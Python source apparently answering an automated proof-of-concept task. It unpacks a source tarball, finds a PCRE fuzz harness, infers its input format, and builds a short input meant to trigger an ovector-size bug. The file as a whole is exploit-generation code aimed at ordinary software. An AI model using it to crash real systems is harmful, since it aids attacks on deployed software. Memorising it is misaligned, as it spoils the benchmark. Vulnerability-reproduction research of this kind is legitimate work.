import os
import re
import tarfile
import tempfile
import shutil
import struct
from typing import Optional, Tuple, List


class Solution:
    def _safe_extract_tar(self, tar_path: str, dst_dir: str) -> None:
        def is_within_directory(directory: str, target: str) -> bool:
            abs_directory = os.path.abspath(directory)
            abs_target = os.path.abspath(target)
            return os.path.commonpath([abs_directory]) == os.path.commonpath([abs_directory, abs_target])

        with tarfile.open(tar_path, "r:*") as tar:
            for member in tar.getmembers():
                member_path = os.path.join(dst_dir, member.name)
                if not is_within_directory(dst_dir, member_path):
                    continue
                tar.extract(member, dst_dir)

    def _read_text_file(self, path: str, max_bytes: int = 2_000_000) -> str:
        try:
            with open(path, "rb") as f:
                data = f.read(max_bytes)
            return data.decode("utf-8", errors="ignore")
        except Exception:
            return ""

    def _collect_source_files(self, root: str) -> List[str]:
        exts = {
            ".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx", ".inc",
            ".txt", ".md", ".cmake", ".m4", ".in",
        }
        files = []
        for dirpath, dirnames, filenames in os.walk(root):
            dirnames[:] = [d for d in dirnames if d not in {".git", ".svn", ".hg", "build", "out", "dist", "bazel-out"}]
            for fn in filenames:
                p = os.path.join(dirpath, fn)
                _, ext = os.path.splitext(fn)
                if ext.lower() in exts:
                    files.append(p)
                else:
                    if fn in {"Makefile", "CMakeLists.txt", "meson.build"}:
                        files.append(p)
        return files

    def _pick_harness_file(self, root: str, files: List[str]) -> Tuple[Optional[str], str]:
        best_path = None
        best_score = -1
        best_text = ""
        for p in files:
            txt = self._read_text_file(p)
            if not txt:
                continue
            if "LLVMFuzzerTestOneInput" not in txt and "AFL_LOOP" not in txt and "fuzzer" not in os.path.basename(p).lower():
                continue
            score = 0
            if "LLVMFuzzerTestOneInput" in txt:
                score += 10
            if "ovector" in txt or "ovec" in txt:
                score += 10
            if "pcre_exec" in txt or "pcre2_match" in txt or "pcre" in txt:
                score += 5
            score += txt.count("ovector") + txt.count("ovec")
            if score > best_score:
                best_score = score
                best_path = p
                best_text = txt
        return best_path, best_text

    def _extract_fuzz_snippet(self, txt: str) -> str:
        idx = txt.find("LLVMFuzzerTestOneInput")
        if idx == -1:
            idx = txt.find("AFL_LOOP")
        if idx == -1:
            return txt[:8000]
        return txt[idx: idx + 12000]

    def _infer_delimiter(self, snippet: str) -> Optional[str]:
        if ("'\\0'" in snippet) or ('"\\0"' in snippet) or ("'\\x00'" in snippet) or ("'\\000'" in snippet):
            return "\0"
        if re.search(r"\bmemchr\s*\([^,]+,\s*0\s*,", snippet):
            return "\0"
        if re.search(r"\bfind\s*\(\s*'\\0'\s*\)", snippet):
            return "\0"
        if ("'\\n'" in snippet) or ('"\\n"' in snippet):
            return "\n"
        if re.search(r"\bfind\s*\(\s*'\\n'\s*\)", snippet) or re.search(r"\bmemchr\s*\([^,]+,\s*'\\n'", snippet):
            return "\n"
        return None

    def _infer_min_size(self, snippet: str) -> int:
        mins = []
        for m in re.finditer(r"if\s*\(\s*(?:size|Size|len|Length)\s*<\s*(\d+)\s*\)\s*return", snippet):
            try:
                mins.append(int(m.group(1)))
            except Exception:
                pass
        return max(mins) if mins else 0

    def _infer_prefix_len_and_needed(self, snippet: str) -> Tuple[int, bool]:
        # Returns (prefix_len, ovecsize_from_input)
        # Detect use of fuzzer bytes/provider to set ovector/ovecsize.
        if "FuzzedDataProvider" in snippet:
            # try to locate ovecsize integral type
            lines = snippet.splitlines()
            for ln in lines:
                if ("ConsumeIntegral" in ln or "ConsumeIntegralInRange" in ln) and re.search(r"\bovec", ln):
                    m = re.search(r"ConsumeIntegral(?:InRange)?\s*<\s*([^>\s]+)\s*>", ln)
                    if m:
                        t = m.group(1)
                        t = t.replace("std::", "")
                        if t in ("uint8_t", "unsigned_char", "unsignedchar", "char", "signedchar", "unsigned", "unsignedint8"):
                            return 1, True
                        if t in ("uint16_t", "unsignedshort", "short", "int16_t"):
                            return 2, True
                        if t in ("uint32_t", "unsignedint", "int", "int32_t"):
                            return 4, True
                        if t in ("uint64_t", "unsignedlonglong", "longlong", "size_t", "uintptr_t", "int64_t"):
                            return 8, True
                    return 4, True
            # provider used but couldn't find explicit ovec line; assume might still
            if re.search(r"\bovec", snippet) and re.search(r"ConsumeIntegral|ConsumeIntegralInRange", snippet):
                return 4, True
            return 0, False

        # Direct data indexing or memcpy
        # Look for memcpy(&ovec..., data, N)
        m = re.search(r"memcpy\s*\(\s*&\s*\w*ovec\w*\s*,\s*data\s*,\s*(\d+)\s*\)", snippet)
        if m:
            try:
                n = int(m.group(1))
                if n in (1, 2, 4, 8):
                    return n, True
            except Exception:
                pass
            return 4, True

        # Look for assignment using data[...]
        best = None
        for m in re.finditer(r"\b\w*ovec\w*\s*=\s*[^;\n]*\bdata\s*\[\s*(\d+)\s*\]", snippet):
            try:
                idx = int(m.group(1))
            except Exception:
                continue
            if best is None or idx > best:
                best = idx
        if best is not None:
            return best + 1, True

        # Look for reinterpret cast reads
        if re.search(r"\*\s*\(\s*(?:const\s+)?(?:u?int(?:32|16|64)_t|int)\s*\*\s*\)\s*data", snippet) and re.search(r"\bovec", snippet):
            # assume 4 unless hint of 16/64
            if "uint16_t" in snippet or "int16_t" in snippet:
                return 2, True
            if "uint64_t" in snippet or "int64_t" in snippet:
                return 8, True
            return 4, True

        return 0, False

    def _encode_le(self, val: int, nbytes: int) -> bytes:
        if nbytes <= 0:
            return b""
        val = max(0, int(val))
        try:
            return val.to_bytes(nbytes, "little", signed=False)
        except Exception:
            if nbytes == 1:
                return struct.pack("<B", val & 0xFF)
            if nbytes == 2:
                return struct.pack("<H", val & 0xFFFF)
            if nbytes == 4:
                return struct.pack("<I", val & 0xFFFFFFFF)
            if nbytes == 8:
                return struct.pack("<Q", val & 0xFFFFFFFFFFFFFFFF)
            return (val & ((1 << (8 * nbytes)) - 1)).to_bytes(nbytes, "little", signed=False)

    def solve(self, src_path: str) -> bytes:
        workdir = None
        root = src_path
        try:
            if os.path.isfile(src_path):
                workdir = tempfile.mkdtemp(prefix="pocgen_")
                self._safe_extract_tar(src_path, workdir)
                root = workdir

            files = self._collect_source_files(root)
            harness_path, harness_text = self._pick_harness_file(root, files)
            snippet = self._extract_fuzz_snippet(harness_text) if harness_text else ""

            delim = self._infer_delimiter(snippet) if snippet else None
            min_size = self._infer_min_size(snippet) if snippet else 0
            prefix_len, ovec_from_input = self._infer_prefix_len_and_needed(snippet) if snippet else (0, False)

            # Choose a moderate ovecsize to trigger the bug but avoid excessive work.
            ovecsize_val = 32

            prefix = self._encode_le(ovecsize_val, prefix_len) if ovec_from_input and prefix_len > 0 else b""

            # Craft body to maximize chance of successful match with zero captures.
            if delim == "\0":
                body = b"a\x00a\x00"
            elif delim == "\n":
                body = b".*\na"
            else:
                # If no clear delimiter, use a simple regex that matches many subjects.
                body = b".*"

            poc = prefix + body

            # If there is a size guard, pad safely.
            if min_size > 0 and len(poc) < min_size:
                pad_byte = b"\x00" if delim == "\0" else b"A"
                poc += pad_byte * (min_size - len(poc))

            # Default fallback if we somehow ended up empty.
            if not poc:
                poc = struct.pack("<I", 32) + b"a\x00a\x00"

            # Keep it reasonably small.
            if len(poc) > 256:
                poc = poc[:256]
            return poc
        finally:
            if workdir is not None:
                shutil.rmtree(workdir, ignore_errors=True)